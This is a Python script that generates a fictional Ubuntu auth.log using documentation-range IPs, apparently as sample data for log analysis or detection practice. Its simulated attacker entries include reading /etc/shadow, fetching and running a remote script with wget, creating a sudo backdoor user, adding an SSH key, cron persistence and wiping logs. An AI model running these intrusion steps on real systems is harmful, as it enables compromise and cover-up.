#!/usr/bin/env python3
"""Generate samples/auth.log: a synthetic but realistic day on an Ubuntu web server.

Everything here is fictional. Public IPs come from the RFC 5737 documentation
ranges (192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24), which are never routed
on the internet.

Story of the day (host web-prod-01, 2026-09-28):
  02:13  password spraying from 198.51.100.23 (many usernames, one real account)
  03:40  noisy brute force against root from 203.0.113.45 (never succeeds)
  06:00  Ansible logs in as root with a key from 10.10.5.5 (internal, legit)
  08:58  admin 'alice' works normally from 10.10.5.21
  09:15  developer 'bob' mistypes his password twice, then tries sudo without rights
  11:02  brute force against 'deploy' from 192.0.2.77 ... succeeds at 11:09:41
  11:10  attacker escalates with sudo, drops a payload, creates backdoor user
         'svc-backup', adds an SSH key, installs cron persistence, wipes traces
  14:27  backdoor account 'svc-backup' logs in from 198.51.100.61
Background: CRON sessions, systemd-logind, PAM noise and a few low-volume scanners.
"""

from __future__ import annotations

import random
from datetime import datetime, timedelta
from pathlib import Path

HOST = "web-prod-01"
DAY = datetime(2026, 9, 28)
rng = random.Random(1337)
lines: list[tuple[datetime, int, str]] = []
_seq = 0
_used_pids: set[int] = set()


def pid(ts: datetime) -> int:
    """PIDs grow through the day like on a real host (~1 new process every 20 s)."""
    p = 1400 + int((ts - DAY).total_seconds() // 20)
    while p in _used_pids:
        p += 1
    _used_pids.add(p)
    return p


def port() -> int:
    return rng.randint(32768, 60999)


def at(hms: str, plus: float = 0) -> datetime:
    h, m, s = (int(x) for x in hms.split(":"))
    return DAY.replace(hour=h, minute=m, second=s) + timedelta(seconds=plus)


def log(ts: datetime, proc: str, msg: str, p: int | None = None) -> None:
    global _seq
    _seq += 1
    tag = f"{proc}[{p}]" if p is not None else proc
    lines.append((ts, _seq, f"{ts:%b} {ts.day:>2} {ts:%H:%M:%S} {HOST} {tag}: {msg}"))


def sudo(ts: datetime, user: str, cmd: str, uid: int, pwd: str | None = None, tty: str = "pts/1") -> None:
    pwd = pwd or f"/home/{user}"
    log(ts, "sudo", f"{user:>8} : TTY={tty} ; PWD={pwd} ; USER=root ; COMMAND={cmd}")
    log(ts, "sudo", f"pam_unix(sudo:session): session opened for user root(uid=0) by {user}(uid={uid})")
    log(ts + timedelta(seconds=1), "sudo", "pam_unix(sudo:session): session closed for user root")


def accepted(ts: datetime, user: str, ip: str, method: str, uid: int, session: int) -> int:
    p = pid(ts)
    extra = " ssh2: ED25519 SHA256:" + "".join(rng.choice("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/")
                                                for _ in range(43)) if method == "publickey" else " ssh2"
    log(ts, "sshd", f"Accepted {method} for {user} from {ip} port {port()}{extra}", p)
    log(ts, "sshd", f"pam_unix(sshd:session): session opened for user {user}(uid={uid}) by (uid=0)", p)
    log(ts, "systemd-logind", f"New session {session} of user {user}.", 612)
    return p


def failed(ts: datetime, user: str, ip: str, valid: bool, p: int, prt: int, repeat: int = 1) -> None:
    who = user if valid else f"invalid user {user}"
    msg = f"Failed password for {who} from {ip} port {prt} ssh2"
    log(ts, "sshd", msg, p)
    if repeat == 2:
        log(ts + timedelta(seconds=3), "sshd", msg, p)
    elif repeat > 2:
        # rsyslog collapses identical consecutive lines
        log(ts + timedelta(seconds=repeat * 2), "sshd", f"message repeated {repeat - 1} times: [ {msg}]", p)


# --- background: cron & logind ------------------------------------------------
for hour in range(24):
    t = DAY.replace(hour=hour, minute=17, second=1)
    p = pid(t)
    log(t, "CRON", "pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)", p)
    log(t + timedelta(seconds=1), "CRON", "pam_unix(cron:session): session closed for user root", p)

# --- low-volume internet scanners (below every threshold) -----------------------
for ip, user, hms in [("203.0.113.8", "admin", "00:41:12"), ("198.51.100.140", "ubnt", "04:55:03"),
                      ("203.0.113.91", "oracle", "07:12:44"), ("192.0.2.160", "test", "16:03:29"),
                      ("198.51.100.7", "user", "21:48:50"), ("203.0.113.8", "support", "23:12:05")]:
    t = at(hms)
    for i in range(rng.randint(1, 3)):
        p, prt = pid(t), port()
        log(t, "sshd", f"Invalid user {user} from {ip} port {prt}", p)
        failed(t + timedelta(seconds=2), user, ip, False, p, prt)
        log(t + timedelta(seconds=3), "sshd", f"Connection closed by invalid user {user} {ip} port {prt} [preauth]", p)
        t += timedelta(seconds=rng.randint(20, 90))

# --- 02:13 password spraying from 198.51.100.23 ---------------------------------
spray_ip = "198.51.100.23"
t = at("02:13:05")
for user in ["admin", "test", "oracle", "postgres", "ubuntu", "git", "ftpuser", "guest", "pi", "deploy",
             "user", "support", "jenkins", "minecraft"]:
    p, prt = pid(t), port()
    valid = user == "deploy"
    if not valid:
        log(t, "sshd", f"Invalid user {user} from {spray_ip} port {prt}", p)
    if user in ("pi", "minecraft"):
        # client gave up before sending a password (typical on key-only probing)
        log(t + timedelta(seconds=1), "sshd",
            f"Connection closed by invalid user {user} {spray_ip} port {prt} [preauth]", p)
    else:
        failed(t + timedelta(seconds=2), user, spray_ip, valid, p, prt)
        log(t + timedelta(seconds=3), "sshd",
            f"Connection closed by {'authenticating' if valid else 'invalid'} user {user} {spray_ip} "
            f"port {prt} [preauth]", p)
    t += timedelta(seconds=rng.randint(15, 30))

# --- 03:40 brute force against root from 203.0.113.45 ---------------------------
bf_ip = "203.0.113.45"
t = at("03:40:11")
remaining = 42
while remaining > 0:
    p, prt = pid(t), port()
    n = min(remaining, rng.choice([3, 4, 6]))
    log(t, "sshd", f"pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= "
                   f"rhost={bf_ip}  user=root", p)
    failed(t + timedelta(seconds=1), "root", bf_ip, True, p, prt, repeat=n)
    if n == 6:
        log(t + timedelta(seconds=14), "sshd",
            f"error: maximum authentication attempts exceeded for root from {bf_ip} port {prt} ssh2 [preauth]", p)
    log(t + timedelta(seconds=15), "sshd",
        f"Disconnecting authenticating user root {bf_ip} port {prt}: Too many authentication failures [preauth]", p)
    remaining -= n
    t += timedelta(seconds=rng.randint(40, 70))

# --- 06:00 Ansible (internal, key-based root login) -----------------------------
accepted(at("06:00:02"), "root", "10.10.5.5", "publickey", 0, 101)

# --- 08:58 admin alice ------------------------------------------------------------
accepted(at("08:58:40"), "alice", "10.10.5.21", "publickey", 1000, 102)
sudo(at("09:01:12"), "alice", "/usr/bin/apt update", 1000, tty="pts/0")
sudo(at("09:03:55"), "alice", "/usr/bin/apt upgrade -y nginx", 1000, tty="pts/0")
sudo(at("09:06:30"), "alice", "/usr/bin/systemctl restart nginx", 1000, tty="pts/0")
sudo(at("09:07:02"), "alice", "/usr/bin/tail -n 50 /var/log/nginx/error.log", 1000, tty="pts/0")
sudo(at("09:40:18"), "alice", "/usr/bin/systemctl enable node-exporter", 1000, tty="pts/0")

# --- 09:15 developer bob: two typos, then sudo without rights --------------------
t = at("09:15:20")
p, prt = pid(t), port()
failed(t, "bob", "10.10.5.30", True, p, prt)
failed(t + timedelta(seconds=4), "bob", "10.10.5.30", True, p, prt)
log(t + timedelta(seconds=9), "sshd", f"Accepted password for bob from 10.10.5.30 port {prt} ssh2", p)
log(t + timedelta(seconds=9), "sshd", "pam_unix(sshd:session): session opened for user bob(uid=1002) by (uid=0)", p)
log(at("09:21:47"), "sudo", "     bob : user NOT in sudoers ; TTY=pts/2 ; PWD=/home/bob ; USER=root ; "
                            "COMMAND=/usr/bin/cat /var/log/syslog")

# --- 11:02 brute force against 'deploy' from 192.0.2.77, then success ----------
atk = "192.0.2.77"
t = at("11:02:10")
for _ in range(23):
    p, prt = pid(t), port()
    failed(t, "deploy", atk, True, p, prt)
    log(t + timedelta(seconds=2), "sshd", f"Connection closed by authenticating user deploy {atk} port {prt} [preauth]", p)
    t += timedelta(seconds=rng.randint(12, 26))
atk_pid = accepted(at("11:09:41"), "deploy", atk, "password", 1001, 103)

# --- post-exploitation ------------------------------------------------------------
sudo(at("11:10:05"), "deploy", "/usr/bin/id", 1001)
sudo(at("11:10:31"), "deploy", "/usr/bin/cat /etc/shadow", 1001)
sudo(at("11:11:02"), "deploy", "/usr/bin/wget http://203.0.113.200/k.sh -O /tmp/.k.sh", 1001)
sudo(at("11:11:15"), "deploy", "/usr/bin/chmod +x /tmp/.k.sh", 1001)
sudo(at("11:11:20"), "deploy", "/tmp/.k.sh", 1001)
sudo(at("11:12:40"), "deploy", "/usr/sbin/useradd -m -s /bin/bash svc-backup", 1001)
p = pid(at("11:12:40"))
log(at("11:12:40"), "useradd", "new group: name=svc-backup, GID=1003", p)
log(at("11:12:40"), "useradd",
    "new user: name=svc-backup, UID=1003, GID=1003, home=/home/svc-backup, shell=/bin/bash, from=/dev/pts/1", p)
sudo(at("11:12:58"), "deploy", "/usr/sbin/usermod -aG sudo svc-backup", 1001)
p = pid(at("11:12:58"))
log(at("11:12:58"), "usermod", "add 'svc-backup' to group 'sudo'", p)
log(at("11:12:58"), "usermod", "add 'svc-backup' to shadow group 'sudo'", p)
sudo(at("11:13:20"), "deploy", "/usr/bin/passwd svc-backup", 1001)
log(at("11:13:27"), "passwd", "pam_unix(passwd:chauthtok): password changed for svc-backup", pid(at("11:13:27")))
sudo(at("11:14:05"), "deploy", "/usr/bin/tee -a /root/.ssh/authorized_keys", 1001)
sudo(at("11:14:40"), "deploy", "/usr/bin/crontab /tmp/.c", 1001)
sudo(at("11:15:22"), "deploy", "/usr/bin/shred -u /var/log/btmp", 1001)
sudo(at("11:15:40"), "deploy", "/usr/bin/rm -f /home/deploy/.bash_history", 1001)
log(at("11:16:02"), "sshd", f"Received disconnect from {atk} port 51522:11: disconnected by user", atk_pid)
log(at("11:16:02"), "sshd", f"Disconnected from user deploy {atk} port 51522", atk_pid)
log(at("11:16:02"), "sshd", "pam_unix(sshd:session): session closed for user deploy", atk_pid)
log(at("11:16:02"), "systemd-logind", "Session 103 logged out. Waiting for processes to exit.", 612)

# --- 13:30 alice again ------------------------------------------------------------
accepted(at("13:30:12"), "alice", "10.10.5.21", "publickey", 1000, 104)
sudo(at("13:31:40"), "alice", "/usr/bin/journalctl -u nginx --since today", 1000, tty="pts/0")

# --- 14:27 backdoor account used ----------------------------------------------------
accepted(at("14:27:10"), "svc-backup", "198.51.100.61", "password", 1003, 105)

# --- write -------------------------------------------------------------------------
lines.sort(key=lambda x: (x[0], x[1]))
out = Path(__file__).with_name("auth.log")
out.write_text("\n".join(text for _, _, text in lines) + "\n", encoding="utf-8")
print(f"wrote {len(lines)} lines to {out}")
